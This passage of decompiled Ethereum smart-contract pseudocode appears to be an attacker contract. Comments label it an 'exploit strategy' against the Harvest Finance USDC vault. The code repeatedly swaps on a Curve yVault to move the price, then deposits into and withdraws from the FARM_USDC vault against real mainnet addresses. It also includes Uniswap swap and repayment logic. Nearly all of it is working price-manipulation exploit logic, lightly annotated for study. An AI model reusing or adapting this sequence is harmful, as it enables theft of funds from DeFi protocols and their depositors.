                          require Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18
                          if (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18 / Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18 != 997:
                              revert with 0, 
                                          32,
                                          33,
                                          0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                          mem[ceil32(return_data.size) + 426 len 31]
                          require (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18
                          if (0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1 < 0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18:
                              revert with 0, 'SafeMath: addition overflow'
                          require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                          call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                               gas gas_remaining wei
                              args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1
                          if not ext_call.success:
                              revert with ext_call.return_data[0 len return_data.size]
                          require return_data.size >= 32
                          require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                          call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.0x22c0d9f with:
                               gas gas_remaining wei
                              args 0, ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18, this.address, 128, 0, mem[ceil32(return_data.size) + 489]
                          if not ext_call.success:
                              revert with ext_call.return_data[0 len return_data.size]
                          if ext_call.return_data < 10003 * stor0 / 9970:
                              if not ext_code.size(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2):
                                  revert with 0, 'Address: call to non-contract'
                              mem[ceil32(return_data.size) + 489 len 64] = transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, Mask(224, 32, (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) >> 32
                              mem[ceil32(return_data.size) + 553 len 0] = 0
                              call 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2.0x471f1852 with:
                                   gas gas_remaining wei
                                  args Mask(224, 32, (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) << 224, mem[ceil32(return_data.size) + 553 len 4]
                              if not return_data.size:
                                  if not ext_call.success:
                                      revert with transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, ext_call.return_data[0]
                                  if not transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10:
                                      revert with 0, 
                                                  32,
                                                  42,
                                                  0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                  mem[ceil32(return_data.size) + 599 len 22]
                              else:
                                  mem[ceil32(return_data.size) + 521 len return_data.size] = ext_call.return_data[0 len return_data.size]
                                  if not ext_call.success:
                                      if return_data.size:
                                          revert with ext_call.return_data[0 len return_data.size]
                                      revert with 0, 'SafeERC20: low-level call failed'
                                  if return_data.size:
                                      require return_data.size >= 32
                                      if not mem[ceil32(return_data.size) + 521]:
                                          revert with 0, 
                                                      32,
                                                      42,
                                                      0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                      mem[(2 * ceil32(return_data.size)) + 600 len 22]
                      else:
                          if (20 * 10^18 * ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * ext_call.return_data / ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18:
                              revert with 0, 
                                          32,
                                          33,
                                          0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                          mem[ceil32(return_data.size) + 362 len 31]
                          if not (20 * 10^18 * ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * ext_call.return_data[18 len 14]):
                              if ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                                  revert with 0, 'SafeMath: subtraction overflow'
                              require Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18
                              if (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18 / Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18 != 997:
                                  revert with 0, 
                                              32,
                                              33,
                                              0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                              mem[ceil32(return_data.size) + 426 len 31]
                              require (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18
                              if (0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1 < 0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18:
                                  revert with 0, 'SafeMath: addition overflow'
                              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                              call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                                   gas gas_remaining wei
                                  args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1
                          else:
                              if (20000 * 10^18 * ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * ext_call.return_data / (20 * 10^18 * ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * ext_call.return_data[18 len 14]) != 1000:
                                  revert with 0, 
                                              32,
                                              33,
                                              0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                              mem[ceil32(return_data.size) + 362 len 31]
                              if ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                                  revert with 0, 'SafeMath: subtraction overflow'
                              require Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18
                              if (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18 / Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18 != 997:
                                  revert with 0, 
                                              32,
                                              33,
                                              0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                              mem[ceil32(return_data.size) + 426 len 31]
                              require (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18
                              if ((20000 * 10^18 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1 < (20000 * 10^18 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18:
                                  revert with 0, 'SafeMath: addition overflow'
                              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                              call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                                   gas gas_remaining wei
                                  args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, ((20000 * 10^18 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1
                          if not ext_call.success:
                              revert with ext_call.return_data[0 len return_data.size]
                          require return_data.size >= 32
                          require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                          call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.0x22c0d9f with:
                               gas gas_remaining wei
                              args 0, ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18, this.address, 128, 0, mem[ceil32(return_data.size) + 489]
                          if not ext_call.success:
                              revert with ext_call.return_data[0 len return_data.size]
                          if ext_call.return_data < 10003 * stor0 / 9970:
                              if not ext_code.size(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2):
                                  revert with 0, 'Address: call to non-contract'
                              mem[ceil32(return_data.size) + 489 len 64] = transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, Mask(224, 32, (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) >> 32
                              call 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2.0x471f1852 with:
                                   gas gas_remaining wei
                                  args Mask(224, 32, (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) << 224, mem[ceil32(return_data.size) + 553 len 4]
                              if not return_data.size:
                                  if not ext_call.success:
                                      revert with transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, ext_call.return_data[0]
                                  if not transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10:
                                      revert with 0, 
                                                  32,
                                                  42,
                                                  0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                  mem[ceil32(return_data.size) + 599 len 22]
                              else:
                                  mem[ceil32(return_data.size) + 521 len return_data.size] = ext_call.return_data[0 len return_data.size]
                                  if not ext_call.success:
                                      if return_data.size:
                                          revert with ext_call.return_data[0 len return_data.size]
                                      revert with 0, 
                                                  'SafeERC20: low-level call failed',
                                                  mem[(2 * ceil32(return_data.size)) + 590 len (2 * ceil32(return_data.size)) - (2 * ceil32(return_data.size))]
                                  if return_data.size:
                                      require return_data.size >= 32
                                      if not mem[ceil32(return_data.size) + 521]:
                                          revert with 0, 
                                                      32,
                                                      42,
                                                      0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                      mem[(2 * ceil32(return_data.size)) + 600 len (2 * ceil32(return_data.size)) + (-2 * ceil32(return_data.size)) + 22]
      else:
          # 3rd exploit strategy exploits harvest usdc vault
          if _param1.length == 3:
              # calls usdc strategy mainnet
              require ext_code.size(0xd55ada00494d96ce1029c201425249f9dfd216cc)
              static call 0xd55ada00494d96ce1029c201425249f9dfd216cc.0x45d01e4a with:
                      gas gas_remaining wei
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]
                
              # Gets usdc balance
              require return_data.size >= 32
              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
              static call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.balanceOf(address owner) with:
                      gas gas_remaining wei
                     args 0xd55ada00494d96ce1029c201425249f9dfd216cc
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Calls iearn yusdc contract
              require return_data.size >= 32
              require ext_code.size(0xd6ad7a6750a7593e092a9b218d66c0a814a3436e)
              static call 0xd6ad7a6750a7593e092a9b218d66c0a814a3436e.0x77c7b8fc with:
                      gas gas_remaining wei
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Curve.fi vyper yvault contract
              require return_data.size >= 32
              require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
              static call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0x65a80d8 with:
                      gas gas_remaining wei
                     args 1
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # USDC token address get balance
              require return_data.size >= 32
              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
              static call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.balanceOf(address owner) with:
                      gas gas_remaining wei
                     args this.address
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Curve.fi yvault swap
              require return_data.size >= 32
              require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
              call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
                   gas gas_remaining wei
                  args 0, 2, 1, (ext_call.return_data * ext_call.return_data / 10^18 * usdc_threshold) + (ext_call.return_data * usdc_threshold) - (ext_call.return_data * usdc_threshold) / 1000, 0
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Get balance of usdc
              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
              static call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.balanceOf(address owner) with:
                      gas gas_remaining wei
                     args this.address
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]
              require return_data.size >= 32
              require ext_code.size(0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe)

              # Deposits in the FARM_USDC vault 
              call 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe.deposit(uint256 amount) with:
                   gas gas_remaining wei
                  args (ext_call.return_data * (ext_call.return_data * ext_call.return_data / 10^18 * usdc_threshold) + (ext_call.return_data * usdc_threshold) - (ext_call.return_data * usdc_threshold) / 1000 / 1000))
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Swaps on yvault again
              require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
              call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
                   gas gas_remaining wei
                  args 0, 1, 2, 1001 * (ext_call.return_data * ext_call.return_data / 10^18 * usdc_threshold) + (ext_call.return_data * usdc_threshold) - (ext_call.return_data * usdc_threshold) / 1000 / 1000, 0
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Get FARM_USDC balance
              require ext_code.size(0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe)
              static call 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe.balanceOf(address owner) with:
                      gas gas_remaining wei
                     args this.address
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Withdraw from FARM_USDC vault
              require return_data.size >= 32
              require ext_code.size(0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe)
              call 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe.withdraw(uint256 amount) with:
                   gas gas_remaining wei
                  args ext_call.return_data[0]
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Swaps on Curve.fi again
              require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
              call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
                   gas gas_remaining wei
                  args 0, 2, 1, (ext_call.return_data * ext_call.return_data / 10^18 * usdc_threshold) + (ext_call.return_data * usdc_threshold) - (ext_call.return_data * usdc_threshold) / 1000, 0
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Checks usdc balance
              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
              static call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.balanceOf(address owner) with:
                      gas gas_remaining wei
                     args this.address
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # deposits into farm usdc vault
              require return_data.size >= 32
              require ext_code.size(0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe)
              call 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe.deposit(uint256 amount) with:
                   gas gas_remaining wei
                  args (ext_call.return_data * (ext_call.return_data * ext_call.return_data / 10^18 * usdc_threshold) + (ext_call.return_data * usdc_threshold) - (ext_call.return_data * usdc_threshold) / 1000 / 1000))
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Swaps on curve again
              require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
              call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
                   gas gas_remaining wei
                  args 0, 1, 2, 1001 * (ext_call.return_data * ext_call.return_data / 10^18 * usdc_threshold) + (ext_call.return_data * usdc_threshold) - (ext_call.return_data * usdc_threshold) / 1000 / 1000, 0
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # checks balance in FARM_USDC vault
              require ext_code.size(0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe)
              static call 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe.balanceOf(address owner) with:
                      gas gas_remaining wei
                     args this.address
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Withdraws from FARM_USDC vault
              require return_data.size >= 32
              require ext_code.size(0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe)
              call 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe.withdraw(uint256 amount) with:
                   gas gas_remaining wei
                  args ext_call.return_data[0]
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Swaps on Curve yvault
              require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
              call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
                   gas gas_remaining wei
                  args 0, 2, 1, (ext_call.return_data * ext_call.return_data / 10^18 * usdc_threshold) + (ext_call.return_data * usdc_threshold) - (ext_call.return_data * usdc_threshold) / 1000, 0
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # gets balance of usdc and deposit
              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
              static call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.balanceOf(address owner) with:
                      gas gas_remaining wei
                     args this.address
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Deposti into farm usdc vault
              require return_data.size >= 32
              require ext_code.size(0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe)
              call 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe.deposit(uint256 amount) with:
                   gas gas_remaining wei
                  args (ext_call.return_data * (ext_call.return_data * ext_call.return_data / 10^18 * usdc_threshold) + (ext_call.return_data * usdc_threshold) - (ext_call.return_data * usdc_threshold) / 1000 / 1000))
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Swaps on Curve Vault
              require ext_code.size(0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51)
              call 0x45f783cce6b7ff23b2ab2d70e416cdb7d6055f51.0xa6417ed6 with:
                   gas gas_remaining wei
                  args 0, 1, 2, 1001 * (ext_call.return_data * ext_call.return_data / 10^18 * usdc_threshold) + (ext_call.return_data * usdc_threshold) - (ext_call.return_data * usdc_threshold) / 1000 / 1000, 0
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Gets farm_usdc balance
              require ext_code.size(0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe)
              static call 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe.balanceOf(address owner) with:
                      gas gas_remaining wei
                     args this.address
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Withdraws from farm
              require return_data.size >= 32
              require ext_code.size(0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe)
              call 0xf0358e8c3cd5fa238a29301d0bea3d63a17bedbe.withdraw(uint256 amount) with:
                   gas gas_remaining wei
                  args ext_call.return_data[0]
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]

              # Calls the usdc contract gets balance and transfers
              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
              static call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.balanceOf(address owner) with:
                      gas gas_remaining wei
                     args this.address
              if not ext_call.success:
                  revert with ext_call.return_data[0 len return_data.size]
              require return_data.size >= 32
              if ext_call.return_data <= ext_call.return_data[0] + 165496489468:
                  revert with 0, 'DEFENSE ENABLED'
              if not ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48):
                  revert with 0, 'Address: call to non-contract'
              mem[260 len 64] = transfer(address to, uint256 value), 0xb4e16d0168e52d35cacd2c61, 3962096092, 11680
              call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.0xec28c9dc with:
                   gas gas_remaining wei
                  args 0x2da00000000000000000000000000000000000000000000000000000000000000000, mem[324 len 4]
              if not return_data.size:
                  if not ext_call.success:
                      revert with transfer(address to, uint256 value), 0xb4e16d0168e52d35cacd2c61, 3962096092, 50165496489468
                  if not transfer(address to, uint256 value), 0xb4e16d0168e52d35cacd2c61:
                      revert with 0, 32, 42, 0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565, mem[370 len 22]
              else:
                  mem[292 len return_data.size] = ext_call.return_data[0 len return_data.size]
                  if not ext_call.success:
                      if return_data.size:
                          revert with ext_call.return_data[0 len return_data.size]
                      revert with 0, 'SafeERC20: low-level call failed'
                  if return_data.size:
                      require return_data.size >= 32
                      if not mem[292]:
                          revert with 0, 
                                      32,
                                      42,
                                      0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                      mem[ceil32(return_data.size) + 371 len 22]

